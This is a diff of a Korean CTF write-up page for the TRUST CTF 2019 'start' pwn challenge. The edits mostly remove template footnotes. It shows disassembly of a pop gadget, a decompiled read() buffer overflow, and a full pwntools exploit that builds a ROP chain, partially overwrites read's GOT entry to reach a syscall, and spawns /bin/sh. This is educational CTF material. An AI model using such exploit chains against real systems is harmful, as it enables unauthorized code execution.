@@ -12,18 +12,18 @@
     
         <meta name="keywords" content="WriteUps,CTF">
     
-    <meta name="description" content="start Binary File Here is a footnote reference,[1] and another.[2] 123456789sub_4005E6 proc near; __unwind &amp;#123;push    rbpmov     rbp, rsppop     raxpop     rdxpop     rdipop     rsiretn [sub_4005E">
+    <meta name="description" content="start Binary File 123456789sub_4005E6 proc near; __unwind &amp;#123;push    rbpmov     rbp, rsppop     raxpop     rdxpop     rdipop     rsiretn [sub_4005E6] 4개의 sub 함수 중 4005E6에는 pop gadget이 있다.  1234567">
 <meta name="keywords" content="WriteUps,CTF">
 <meta property="og:type" content="article">
 <meta property="og:title" content="TRUST CTF 2019 start">
 <meta property="og:url" content="http://j0n9hyun.github.io/2019/02/15/pwnstart/index.html">
 <meta property="og:site_name" content="j0n9hyun">
-<meta property="og:description" content="start Binary File Here is a footnote reference,[1] and another.[2] 123456789sub_4005E6 proc near; __unwind &amp;#123;push    rbpmov     rbp, rsppop     raxpop     rdxpop     rdipop     rsiretn [sub_4005E">
+<meta property="og:description" content="start Binary File 123456789sub_4005E6 proc near; __unwind &amp;#123;push    rbpmov     rbp, rsppop     raxpop     rdxpop     rdipop     rsiretn [sub_4005E6] 4개의 sub 함수 중 4005E6에는 pop gadget이 있다.  1234567">
 <meta property="og:locale" content="ko">
-<meta property="og:updated_time" content="2019-05-22T13:13:19.120Z">
+<meta property="og:updated_time" content="2019-05-22T13:48:54.210Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="TRUST CTF 2019 start">
-<meta name="twitter:description" content="start Binary File Here is a footnote reference,[1] and another.[2] 123456789sub_4005E6 proc near; __unwind &amp;#123;push    rbpmov     rbp, rsppop     raxpop     rdxpop     rdipop     rsiretn [sub_4005E">
+<meta name="twitter:description" content="start Binary File 123456789sub_4005E6 proc near; __unwind &amp;#123;push    rbpmov     rbp, rsppop     raxpop     rdxpop     rdipop     rsiretn [sub_4005E6] 4개의 sub 함수 중 4005E6에는 pop gadget이 있다.  1234567">
     
 	<link rel="canonical" href="http://j0n9hyun.github.io/2019/02/15/pwnstart/">
 
@@ -176,20 +176,17 @@
         
         
         <div class="article-entry" itemprop="articleBody">
-            <h2 id="start"><a class="markdownIt-Anchor" href="#start"></a> start</h2>
+            <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css"><h2 id="start"><a class="markdownIt-Anchor" href="#start"></a> start</h2>
 <p><a href="/j0n9hyun.github.io/upload/start.zip">Binary File</a></p>
-<p>Here is a footnote reference,<sup class="footnote-ref"><a href="#fn1" id="fnref1">[1]</a></sup> and another.<sup class="footnote-ref"><a href="#fn2" id="fnref2">[2]</a></sup></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">sub_4005E6 proc near</span><br><span class="line">; __unwind &#123;</span><br><span class="line">push    rbp</span><br><span class="line">mov     rbp, rsp</span><br><span class="line">pop     rax</span><br><span class="line">pop     rdx</span><br><span class="line">pop     rdi</span><br><span class="line">pop     rsi</span><br><span class="line">retn</span><br></pre></td></tr></table></figure>
 <center><small>[sub_4005E6]</small></center>
-4개의 sub 함수 중 4005E6에는 pop gadget이 있다.  
-<br>
+4개의 sub 함수 중 4005E6에는 pop gadget이 있다. <br>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+0h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x78</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <center><small>[main]</small></center>
 바이너리 파일을 뜯어보면 sub로 시작하는 함수 4개와 메인함수가 있다.  
 언뜻봐도 알 수 있듯이 read 함수에서 BOF 취약점이 터지는 것을 확인할 수 있다.  
 보통은 write 같은 함수가 주어져야 하는데 read 함수밖에 없는 걸로 보아 일반적으로 하는 ROP 기법은 사용할 수 없다. 그래서 같이 주어져 있는 libc 파일에서 syscall 가젯을 사용한다.  
-주소값의 하위 3비트는 고정적인 값을 지니고 있기 때문에 read의 libc 주소 1 바이트를 syscall의 하위 1 바이트 주소로 바꿔서 보내면 된다.  
-<br>
+주소값의 하위 3비트는 고정적인 값을 지니고 있기 때문에 read의 libc 주소 1 바이트를 syscall의 하위 1 바이트 주소로 바꿔서 보내면 된다. <br>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#r = remote('server.trustctf.com', 10392)</span></span><br><span class="line">r = process(<span class="string">'./start'</span>)</span><br><span class="line">e = ELF(<span class="string">'./start'</span>)</span><br><span class="line">pr = <span class="number">0x4005ed</span> <span class="comment"># pop rsi</span></span><br><span class="line">ppppr = <span class="number">0x4005ea</span> <span class="comment"># pop rax,rdx,rdi,rsi</span></span><br><span class="line">cmd = <span class="string">"/bin/sh\x00"</span></span><br><span class="line">syscall = <span class="string">"\x7b"</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">""</span></span><br><span class="line">payload += <span class="string">"A"</span>*<span class="number">24</span></span><br><span class="line">payload += p64(pr)</span><br><span class="line">payload += p64(e.bss())</span><br><span class="line">payload += p64(e.plt[<span class="string">'read'</span>])</span><br><span class="line"></span><br><span class="line">payload += p64(pr)</span><br><span class="line">payload += p64(e.got[<span class="string">'read'</span>])</span><br><span class="line">payload += p64(e.plt[<span class="string">'read'</span>])</span><br><span class="line"></span><br><span class="line">payload += p64(ppppr)</span><br><span class="line">payload += p64(<span class="number">59</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(e.bss())</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(e.plt[<span class="string">'read'</span>])</span><br><span class="line">payload += cmd</span><br><span class="line"></span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.send(syscall)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
 <center><small>[Exploit Code]</small></center>
 <style>
@@ -198,17 +195,6 @@
       box-shadow: 0 4px 8px 0 rgba(0, 0, 0, 0.2), 0 6px 20px 0 rgba(0, 0, 0, 0.19);
   }
 </style>
-<hr class="footnotes-sep">
-<section class="footnotes">
-<ol class="footnotes-list">
-<li id="fn1" class="footnote-item"><p>감사합니다 <a href="#fnref1" class="footnote-backref">↩︎</a></p>
-</li>
-<li id="fn2" class="footnote-item"><p>Here’s one with multiple blocks.</p>
-<p>Subsequent paragraphs are indented to show that they<br>
-belong to the previous footnote. <a href="#fnref2" class="footnote-backref">↩︎</a></p>
-</li>
-</ol>
-</section>
 
         </div>
         <footer class="article-footer">
@@ -296,10 +282,11 @@ belong to the previous footnote. <a href="#fnref2" class="footnote-backref">↩�
         "url": "http://j0n9hyun.github.io/2019/02/15/pwnstart/",
         "description": " start
 Binary File
-Here is a footnote reference,[1] and another.[2]
 123456789sub_4005E6 proc near; __unwind &#123;push    rbpmov     rbp, rsppop     raxpop     rdxpop     rdipop     rsiretn
-[sub_4005E"
-        "wordCount": 432
+[sub_4005E6]
+4개의 sub 함수 중 4005E6에는 pop gadget이 있다. 
+1234567"
+        "wordCount": 393
     }
 </script>
 
